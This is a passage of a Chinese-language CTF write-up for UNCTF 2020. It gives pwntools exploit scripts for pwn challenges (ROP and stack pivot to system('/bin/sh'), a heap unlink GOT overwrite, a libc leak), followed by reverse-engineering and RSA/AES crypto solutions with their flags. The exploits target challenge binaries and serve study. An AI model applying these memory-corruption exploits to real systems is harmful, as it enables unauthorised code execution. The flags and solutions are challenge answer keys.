class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> RBP  0x6025d8 ◂— 0xdeadbeef</span></span><br><span class="line"><span class="string"> RSP  0x602628 ◂— 0x0</span></span><br><span class="line"><span class="string"> RIP  0x400b24 ◂— leave  </span></span><br><span class="line"><span class="string">──────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string"> ► 0x400b24    leave  </span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string"> ► 0x400b24    leave  </span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string"> ► 0x400b24    leave  </span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400d13    pop    rdi</span></span><br><span class="line"><span class="string">   0x400d14    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400c8c    call   system@plt &lt;0x400700&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'\x00\x00\x00\x00\x00sh\x00'</span>+p64(<span class="number">0xdeadbeef</span>)+p64(ret)+p64(rdi)+p64(<span class="number">0x6025d5</span>)+p64(system)+p64(<span class="number">0x6025d8</span>)+p64(ret)+p64(ret)+p64(ret)+p64(leave))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.sendline(<span class="string">'exec /bin/sh 1&gt;&amp;2'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h4 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h4><p>程序流程=&gt;</p>
<p>1.关闭了fastbin</p>
<p>2.菜单题，add delete，edit，没有show函数</p>
<p>3.got表可改</p>
<p>考点=&gt;</p>
<p>1.unlink</p>
<p>2.堆构造</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p=process(<span class="string">"./baby_heap"</span>)</span><br><span class="line"><span class="comment">#p=remote("node2.hackingfor.fun",32991)</span></span><br><span class="line">elf=ELF(<span class="string">"./baby_heap"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"size?\n"</span>,str(size))</span><br><span class="line">	p.sendafter(<span class="string">"content?\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,new_content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index ?\n"</span>,str(index))</span><br><span class="line">	p.sendafter(<span class="string">"what is your new content ?\n"</span>,new_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index ?\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index ?\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line">globals = <span class="number">0x602160</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">"a"</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">"a"</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">FD = globals+<span class="number">16</span><span class="number">-0x20</span></span><br><span class="line">BK = globals+<span class="number">16</span><span class="number">-0x10</span><span class="number">-0x8</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x80</span>)+p64(FD)+p64(BK)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">'A'</span>)</span><br><span class="line">payload += p64(<span class="number">0x80</span>) + p8(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment">#atoi_got = elf.got['atoi']</span></span><br><span class="line">malloc_got=elf.got[<span class="string">'malloc'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_got"</span>+hex(free_got)+<span class="string">"********************************"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_got"</span>+hex(puts_got)+<span class="string">"********************************"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_plt"</span>+hex(puts_plt)+<span class="string">"********************************"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x10</span>+p64(free_got)</span><br><span class="line">                    <span class="comment">#0                 #1              #2</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x40097f</span>))          <span class="comment">#free_got -&gt;puts_plt</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)                        <span class="comment">#puts(puts_got)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h4 id="keer’s-bug"><a href="#keer’s-bug" class="headerlink" title="keer’s_bug"></a>keer’s_bug</h4><p>漏洞点=&gt;read函数存在栈溢出</p>
<p>利用思路=&gt; 先栈迁移到bss 段 然后leak libc ，有了libc后。然后再栈迁移下去getshell。</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process("./keer")</span></span><br><span class="line">p=remote(<span class="string">"node2.hackingfor.fun"</span>,<span class="number">36099</span>)</span><br><span class="line">elf=ELF(<span class="string">"./keer"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x601160</span>+<span class="number">0x200</span><span class="comment">#0x601360</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400673</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x400671</span></span><br><span class="line">jmp_rbp_content=<span class="number">0x400783</span></span><br><span class="line">leave_ret=<span class="number">0x40060D</span></span><br><span class="line">start_addr=<span class="number">0x4004C0</span> </span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Come on!! You can ri keer!!!\n"</span>)</span><br><span class="line"></span><br><span class="line">pd=<span class="string">"a"</span>*<span class="number">0x50</span>+p64(bss_addr)+p64(<span class="number">0x4005ED</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(pd)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">pd=<span class="string">"a"</span>*<span class="number">0x8</span>+p64(pop_rsi_r15_ret)+p64(write_got)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(write_plt)+p64(start_addr)+<span class="string">"flag\x00\x00\x00\x00"</span>*<span class="number">2</span>+p64(<span class="number">0x601310</span>)+p64(leave_ret) <span class="comment">#flag_addr:0x601350</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_addr=<span class="number">0x601350</span></span><br><span class="line">p.sendline(pd)</span><br><span class="line"></span><br><span class="line">write_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr : "</span>+hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-libc.sym[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">bin_sh=libc_base+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base : "</span>+hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr : "</span>+hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bin_sh : "</span>+hex(bin_sh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Come on!! You can ri keer!!!\n"</span>)</span><br><span class="line">		<span class="comment">#0x601660</span></span><br><span class="line">pd=<span class="string">"a"</span>*<span class="number">0x50</span>+p64(bss_addr+<span class="number">0x200</span>+<span class="number">0x100</span>)+p64(<span class="number">0x4005ED</span>)</span><br><span class="line">p.sendline(pd)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">start=<span class="number">0x4005B6</span></span><br><span class="line">pd=<span class="string">"aaaaaaaa"</span>+p64(pop_rsi_r15_ret)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)+p64(start_addr)+<span class="string">"aaaaaaaa"</span>*<span class="number">2</span>+p64(<span class="number">0x601310</span>+<span class="number">0x200</span>+<span class="number">0x100</span>)+p64(leave_ret)                                  <span class="comment">#read(3,bss_addr,len)</span></span><br><span class="line">p.sendline(pd)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="re-checkin"><a href="#re-checkin" class="headerlink" title="re_checkin"></a>re_checkin</h4><p>ida打开，搜索字符串，找到主程序</p>
<p><img src="/images/unctf2020/image-20201115161253904.png" alt="img"></p>
<p>输出success的条件是输入的Str1与Str2相等。查看Str2，看到很多字节数据，都存在于sub_4015DC函数。进入这一函数：</p>
<p><img src="C:%5CUsers%5CDrizzle%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201115161509640.png" alt="image-20201115161509640"></p>
<p>从上往下，得到flag</p>
<h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>利用pyinstxtractor.py拆解exe为pyc</p>
<p>直接执行python pyinstxtractor.py run.exe得到run.pyc，利用在线工具进行反编译，得到python代码如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"></span><br><span class="line">str2 = <span class="string">'UMAQBvogWLDTWgX"""k'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    flag += chr(ord(str2[i]) + i)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div>

<p>直接运行得到flag。</p>
<p>flag：UNCTF{un_UN_ctf123}</p>
<h4 id="easyMaze"><a href="#easyMaze" class="headerlink" title="easyMaze"></a>easyMaze</h4><p>比较简单，ida找到数据块，静态审计确定为10*10的迷宫</p>
<p><img src="/images/unctf2020/image-20201115185606658.png" alt="img"></p>
<p><img src="/images/unctf2020/image-20201115185310796.png" alt="img"></p>
<p>o是路径 O是起点 0是墙 S是终点</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">O<span class="meta">o00</span>oD<span class="number">00</span>SD</span><br><span class="line"><span class="number">0</span>ooo<span class="meta">o0</span>Dooo</span><br><span class="line"><span class="meta">o0</span>D<span class="number">0</span>oD<span class="number">0</span><span class="meta">o00</span></span><br><span class="line">oooo<span class="meta">o00</span><span class="meta">o00</span></span><br><span class="line">oD<span class="number">0</span>D<span class="number">0</span>ooooo</span><br><span class="line"><span class="meta">o00</span><span class="meta">o0</span><span class="meta">o0</span><span class="meta">o0</span>o</span><br><span class="line">oDoooooDDD</span><br><span class="line"><span class="meta">o00</span><span class="meta">o00</span>oooo</span><br><span class="line">oD<span class="number">0</span>D<span class="number">0000</span>oD</span><br><span class="line">oooooooooD</span><br></pre></td></tr></table></figure></div>

<p>走一遍，得到flag</p>
<p>flag：unctf{dsdddssaaaassssssddddddddwwaawawwddwwwdw}</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h4 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h4><p>题目附件：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">p = number.getPrime(<span class="number">1024</span>)</span><br><span class="line">q = number.getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> p &gt; q:</span><br><span class="line">  a = p + q</span><br><span class="line">  b = p - q</span><br><span class="line">  print(a,b)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = bytes_to_long(<span class="string">b'msg'</span>)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br></pre></td></tr></table></figure></div>

<p>题目给出了输出的a,b,c。结合加密过程可算出p，q的值。</p>
<p><strong>Decrypt</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment">#author:As1def</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">q=<span class="number">155422298738009940394189206134042119662513162560610248399569107132538620220590060772127789136918984458521940817304671619205395736161534795149599241668486283754795346411784845057685713557075371605135986388011998610261360520650827734187124699589734496097678970899686056997267797534053934064148348759788335157899</span></span><br><span class="line"></span><br><span class="line">p=<span class="number">164976388739628973581511063883090363893890874421691770454048880284500992179926996908823840726558454111596699286948761026319434957217223527703429627592448959262532954019810985574583860227624287638908448719207441426500367172146028171043107126122608800640249201232870138119493156975216320985668013888561826953269</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br><span class="line"></span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=int(gmpy2.invert(e,phi))</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure></div>

<p>flag：UNCTF{welcome_to_rsa}</p>
<h4 id="鞍山大法官开庭之缺的营养这一块怎么补"><a href="#鞍山大法官开庭之缺的营养这一块怎么补" class="headerlink" title="鞍山大法官开庭之缺的营养这一块怎么补"></a>鞍山大法官开庭之缺的营养这一块怎么补</h4><p>题目</p>
<blockquote>
<p>某日，鞍山大法官在点外卖时点了2个韭菜盒子，商家只送了1个，大法官给了该商家一个差评 次日，该大法官又在该商家点了1个韭菜盒子，希望商家能补上上次的韭菜盒子，而商家又只发了一个韭菜盒子 这名大法官一天正常要吃2个韭菜盒子，而该商家每天只给他1个韭菜盒子，请问该名大法官缺的营养这一块怎么补</p>
<p>ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotootto</p>
</blockquote>
<p>由题目描述想到培根密码，将o，t分别替换成a，b，解密培根得到：PEIGENHENYOUYINGYANG</p>
<p>flag：unctf{PEIGENHENYOUYINGYANG}</p>
<h4 id="简单的RSA"><a href="#简单的RSA" class="headerlink" title="简单的RSA"></a>简单的RSA</h4><p>知识点：</p>
<p>低解密指数攻击<br>e很大，维纳攻击</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment">#author:As1def</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">  frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">  convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">  <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">    <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">      phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">      s = n - phi + <span class="number">1</span></span><br><span class="line">      discr = s * s - <span class="number">4</span> * n</span><br><span class="line">      <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">        t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">        <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">          print(<span class="string">"Hacked!"</span>)</span><br><span class="line">          <span class="keyword">return</span> d</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    e= <span class="number">18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781</span></span><br><span class="line">    n= <span class="number">147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701</span></span><br><span class="line">    c= <span class="number">140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934</span></span><br><span class="line">    d = wiener_hack(e, n)</span><br><span class="line">    m = pow(c,d,n)</span><br><span class="line">    <span class="keyword">print</span> long_to_bytes(m)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure></div>

<p>flag：unctf{wi3n3r_Att@ck}</p>
<h4 id="wing"><a href="#wing" class="headerlink" title="wing"></a>wing</h4><p>题目描述：</p>
<p>你过office二级了吗？</p>
<p><img src="/images/unctf2020/wing.png" alt=""></p>
<p>由题目描述想到与office文件有关，打开word，找到</p>
<p><img src="/images/unctf2020/word.png" alt=""></p>
<p>找到如下对应关系：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASIC"><figure class="iseeu highlight /basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">117 </span> u</span><br><span class="line"><span class="symbol">110 </span> n</span><br><span class="line"><span class="symbol">99 </span> c</span><br><span class="line"><span class="symbol">116 </span>t</span><br><span class="line"><span class="symbol">102 </span> f</span><br><span class="line"><span class="symbol">123 </span>&#123;</span><br><span class="line"><span class="symbol">119 </span> w </span><br><span class="line"><span class="symbol">105 </span>i</span><br><span class="line"><span class="symbol">110 </span>n</span><br><span class="line"><span class="symbol">103 </span>g</span><br><span class="line"><span class="symbol">100 </span>d</span><br><span class="line"><span class="symbol">105 </span>i</span><br><span class="line"><span class="symbol">110 </span>n</span><br><span class="line"><span class="symbol">103 </span>g</span><br><span class="line"><span class="symbol">115 </span>s</span><br><span class="line"><span class="symbol">95 </span>_</span><br><span class="line"><span class="symbol">105 </span>i</span><br><span class="line"><span class="symbol">115 </span>s</span><br><span class="line"><span class="symbol">95 </span>_</span><br><span class="line"><span class="symbol">105 </span>i</span><br><span class="line"><span class="symbol">110 </span>n</span><br><span class="line"><span class="symbol">99 </span>c</span><br><span class="line"><span class="symbol">111 </span>o</span><br><span class="line"><span class="symbol">109 </span>m</span><br><span class="line"><span class="symbol">112 </span>p</span><br><span class="line"><span class="symbol">114 </span>r</span><br><span class="line"><span class="symbol">101 </span>e</span><br><span class="line"><span class="symbol">104 </span>h</span><br><span class="line"><span class="symbol">101 </span>e</span><br><span class="line"><span class="symbol">110 </span>n</span><br><span class="line"><span class="symbol">115 </span>s</span><br><span class="line"><span class="symbol">105 </span>i</span><br><span class="line"><span class="symbol">98 </span> b</span><br><span class="line"><span class="symbol">108 </span>l</span><br><span class="line"><span class="symbol">101 </span>e</span><br><span class="line"><span class="symbol">125 </span>&#125;</span><br></pre></td></tr></table></figure></div>

<p>flag：unctf{wingdings_is_incomprehensible}</p>
<h4 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h4><p>题目描述：</p>
<blockquote>
<p>Really baby problem about block cipher</p>
</blockquote>
<p>题目给出了加密源码和output输出文本。</p>
<p><strong>encrypt</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">random.seed(urandom(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">key1 = <span class="string">'0'</span>*<span class="number">13</span> + <span class="string">''</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">key2 = <span class="string">''</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]) + <span class="string">'0'</span>*<span class="number">13</span></span><br><span class="line"></span><br><span class="line">cipher1 = AES.new(key=key1.encode(), mode=AES.MODE_ECB)</span><br><span class="line">cipher2 = AES.new(key=key2.encode(), mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">pt = input(<span class="string">"You have a chance to get something: "</span>)</span><br><span class="line">pt = pt.encode()</span><br><span class="line"></span><br><span class="line">val = len(pt) % <span class="number">16</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> val == <span class="number">0</span>:</span><br><span class="line">  pt += <span class="string">b'\x00'</span>*(<span class="number">16</span> - val)</span><br><span class="line"></span><br><span class="line">c1 = cipher1.encrypt(pt)</span><br><span class="line">c2 = cipher2.encrypt(c1)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Your cipher:&#123;&#125;'</span>.format(hexlify(c2)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(len(flag) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">c3 = cipher1.encrypt(flag)</span><br><span class="line">c4 = cipher2.encrypt(c3)</span><br><span class="line">print(<span class="string">'Your flag:&#123;&#125;'</span>.format(hexlify(c4)))</span><br></pre></td></tr></table></figure></div>

<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">You have a chance to get something: UNCTF2020_Enjoy_Crypto<span class="symbol">~</span></span><br><span class="line"><span class="symbol">Your cipher</span>:b'01a4e429e76db218fa0eb18f03ec69c<span class="number">9200</span>a<span class="number">2362</span>d8b4d7ea<span class="number">4617</span>0ce<span class="number">698389</span>bbd'</span><br><span class="line">Your flag:b'196cc94c2d685beb54beeaa14c1dc0a6f<span class="number">3794</span>d65fca0d1a<span class="number">1274515166</span>e<span class="number">4255</span>ab<span class="number">36738309</span>2e42d<span class="number">774992</span>f74bc138faaad'</span><br></pre></td></tr></table></figure>

<p>分组密码，通过观察题目给的条件，有明文对应的密文，但还是需要两个key，这时想到中间相遇攻击，将明文通过key1进行加密，把所有密文1和key值存储下来，可以单独开辟一块内存空间存储这些值。再将密文通过key2进行解密，再去跟前面存储的数据对比寻找相同密文以及对应key1，再解出对应密文值即可。</p>
<p><strong>decrypt</strong></p>
